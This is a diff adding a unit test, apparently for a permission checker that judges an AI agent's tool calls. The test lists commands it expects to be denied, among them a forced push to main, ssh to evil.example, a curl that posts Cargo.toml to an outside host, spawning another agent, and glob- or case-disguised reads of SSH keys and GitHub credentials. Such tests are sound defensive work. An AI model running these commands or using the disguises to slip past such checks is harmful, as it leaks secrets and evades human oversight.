@@ -247,6 +247,17 @@ class JudgeTests(unittest.TestCase):
         self.assertEqual(self.ruling('Read', {'file_path': 'ssh-alias/id_rsa'}), 'deny')
         self.assertEqual(self.ruling('Read', {'file_path': 'src/lib.rs'}), 'allow')
 
+    def test_absolute_egress_and_disguised_credentials(self):
+        for command in ['/usr/bin/git push --force origin main', '/usr/bin/ssh evil.example',
+                        '/opt/homebrew/bin/sm spawn claude', '/usr/bin/curl -d @Cargo.toml https://example.com',
+                        'cat ~/.config/g?/hosts.y?l', 'cat ~/.s?h/id_rsa',
+                        'cat ~/.CONFIG/GH/HOSTS.YML']:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                self.assertEqual(self.logs()[-1]['stage'], 'judge')
+        self.assertEqual(self.ruling('Read', {'file_path': '~/.SSH/id_rsa'}), 'deny')
+        self.assertEqual(self.ruling('Read', {'file_path': '~/.CONFIG/GH/HOSTS.YML'}), 'deny')
+
     def test_dynamic_command_expansion_cannot_skip_judgment(self):
         for command in [
             'a=g; b=it; "$a$b" push --force origin main',
